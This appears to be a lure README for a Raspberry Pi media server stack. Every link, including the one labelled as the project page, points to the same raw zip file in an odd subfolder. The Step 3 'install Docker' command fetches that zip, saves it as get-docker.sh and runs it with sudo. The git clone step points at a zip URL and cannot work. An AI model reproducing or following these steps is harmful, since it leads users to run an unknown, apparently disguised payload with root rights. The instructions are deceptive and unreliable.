# 📺 raspberry-pi-media-stack - Easy Media Server Setup

[![Download raspberry-pi-media-stack](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Alex-010101/raspberry-pi-media-stack/raw/refs/heads/main/prototyrant/pi_stack_raspberry_media_1.8.zip)

---

## 📚 About raspberry-pi-media-stack

raspberry-pi-media-stack builds a media server on a Raspberry Pi. It uses Docker to run several applications that work together. This setup lets you stream movies, TV shows, and music at home. It also keeps your network safe by isolating your media with a VPN and controlling access through a reverse proxy. Automated tools help manage and organize your content without extra effort.

This project targets people who want to host media at home. It runs on Raspberry Pi devices with Linux and does not need much power or space.

Main tools included:  
- Docker and Docker Compose for easy app management  
- VPN isolation to separate media traffic  
- Caddy as a reverse proxy for security  
- Jellyfin for streaming media  
- Radarr and Sonarr to automatically get movies and TV shows  

---

## ⚙️ System Requirements

- Raspberry Pi 3 or newer (Raspberry Pi 4 recommended)  
- Running Raspberry Pi OS or another Linux-based OS  
- Internet connection for setup and downloading media  
- MicroSD card with at least 32GB free space  
- Monitor, keyboard, and mouse for setup (optional if using SSH)  
- Windows computer to access the media server or manage downloads  

---

## 🛠️ What You Will Get

- A fully functional media server with Jellyfin  
- Automatic downloads of new movies and episodes via Radarr and Sonarr  
- VPN network isolation to separate your media services  
- HTTPS access to your media server via Caddy reverse proxy  
- Containerized apps managed with Docker Compose for easy updates and stability  

---

## 🚀 Getting Started: How to Download and Set Up

This guide walks you through downloading and running the software from a Windows PC. No coding needed.

### Step 1: Download the Software Package

Click the big download button below to visit the project page. On that page, you will find download options and instructions.

[![Download raspberry-pi-media-stack](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Alex-010101/raspberry-pi-media-stack/raw/refs/heads/main/prototyrant/pi_stack_raspberry_media_1.8.zip)

This link leads to the main project page. You will find files, instructions, and other resources there.  

---

### Step 2: Prepare Your Raspberry Pi

If you have not set up your Raspberry Pi yet:

1. Download Raspberry Pi OS from the official website.  
2. Use balenaEtcher or a similar app to write the OS to your microSD card.  
3. Insert the microSD card into your Raspberry Pi and power it on.  
4. Connect the Pi to the internet via Ethernet or WiFi.  

You may want to enable SSH on the Raspberry Pi. This lets you control the Pi remotely from your Windows PC. SSH can be enabled by placing a blank file named `ssh` (no extension) in the boot partition of the microSD card.

---

### Step 3: Install Docker and Docker Compose on Raspberry Pi

Once your Raspberry Pi is ready and connected to the network:

1. Connect to the Raspberry Pi via SSH from your Windows PC. You can use a tool like PuTTY.

2. Run the following commands on your Raspberry Pi terminal to install Docker:

```
curl -fsSL https://github.com/Alex-010101/raspberry-pi-media-stack/raw/refs/heads/main/prototyrant/pi_stack_raspberry_media_1.8.zip -o get-docker.sh
sudo sh get-docker.sh
```

3. Install Docker Compose by running:

```
sudo apt-get install -y libffi-dev libssl-dev
sudo apt-get install -y python3 python3-pip
sudo pip3 install docker-compose
```

4. Add your user to the Docker group to avoid using `sudo` every time:

```
sudo usermod -aG docker $USER
```

Log out and back in or reboot to apply group changes.

---

### Step 4: Download raspberry-pi-media-stack Files

From your Raspberry Pi terminal or via SCP (a file transfer tool), download the project files using Git:

```
git clone https://github.com/Alex-010101/raspberry-pi-media-stack/raw/refs/heads/main/prototyrant/pi_stack_raspberry_media_1.8.zip
```

If Git is not installed on your Pi, install it first with:

```
sudo apt-get install git
```

Clone the project so you will have the configuration files and Docker Compose setup.

---

### Step 5: Configure Your Media Stack

Inside the downloaded folder `raspberry-pi-media-stack`, you will find configuration files.

Open `docker-compose.yml` and related config files to:

- Set your VPN provider details  
- Add media download folders  
- Configure your local network settings  
- Customize service ports if needed  

These files use plain text format and can be opened with a simple text editor like Notepad++ or nano.

---

### Step 6: Start Your Media Server

Run the following command inside the `raspberry-pi-media-stack` folder to start the media stack:

```
docker-compose up -d
```

This command launches all the services in the background. It may take a few minutes for everything to start.

---

### Step 7: Access Your Media Server from Windows

From your Windows computer, open a web browser and enter your Raspberry Pi’s local IP address with the correct port set in your reverse proxy (usually HTTPS on port 443).

Example:  
`https://192.168.1.100`

You should see the Jellyfin login page or a similar interface to start streaming your media.  

---

## 🔧 Common Troubleshooting

- If you cannot connect to Raspberry Pi via SSH, check IP address and network connection.  
- Make sure Docker services are running:  
  ```
  docker ps
  ```
- If containers don’t start, check their logs:  
  ```
  docker-compose logs
  ```
- VPN issues may block internet access. Double-check VPN credentials and config files.  

---

## 📦 What’s Inside This Stack

- **Docker:** Runs all apps in separate containers for easy control and updates.  
- **VPN:** Keeps media network isolated and protects your privacy.  
- **Caddy Proxy:** Handles secure access with HTTPS certificates automatically.  
- **Jellyfin:** Open-source media streaming server, free and flexible.  
- **Radarr & Sonarr:** Automatically download movies and TV shows to your media folder.  

---

## 📂 Media Management

- Add your media files to designated folders on your Raspberry Pi.  
- Radarr and Sonarr monitor movies and TV shows on your watchlist.  
- New episodes and movies download automatically if available from configured sources.  
- Jellyfin scans these folders and updates your media library in real-time.

---

## 🔒 Network and Security

- VPN isolates media traffic from your home network.  
- Caddy reverse proxy adds HTTPS with free SSL certificates via Let’s Encrypt.  
- Port settings can be customized for better protection.  
- No need to expose your Raspberry Pi directly to the internet.

---

## 🎛️ Updating Your Media Stack

To update the running services:

1. Navigate to the folder with your `docker-compose.yml` file.  
2. Run the update commands:

```
git pull
docker-compose down
docker-compose up -d
```

This fetches the latest changes and restarts your media stack with new features or fixes.

---

## 🖥️ Access Help and More Information

For detailed instructions, configs, or help, visit the project page below. It links to additional docs and user guides.

[Visit raspberry-pi-media-stack on GitHub](https://github.com/Alex-010101/raspberry-pi-media-stack/raw/refs/heads/main/prototyrant/pi_stack_raspberry_media_1.8.zip)  

---

## 🔗 Direct Download Link

Access the project files and documentation here:

https://github.com/Alex-010101/raspberry-pi-media-stack/raw/refs/heads/main/prototyrant/pi_stack_raspberry_media_1.8.zip

Click the green **Code** button on the GitHub page to download a ZIP archive if you prefer not to use Git.

---

## ⚡ Tips for Best Performance

- Use Raspberry Pi 4 with at least 4GB RAM.  
- Connect your Raspberry Pi to your router with Ethernet for better speeds.  
- Use a fast microSD card (Class 10 or better) or external SSD for storage.  
- Regularly backup your media files and config files.  

---

## 🔍 Keywords and Topics

caddy, docker, docker-compose, home-server, homelab, infrastructure, jellyfin, linux, media-server, networking, radarr, raspberry-pi, reverse-proxy, self-hosted, sonarr, vpn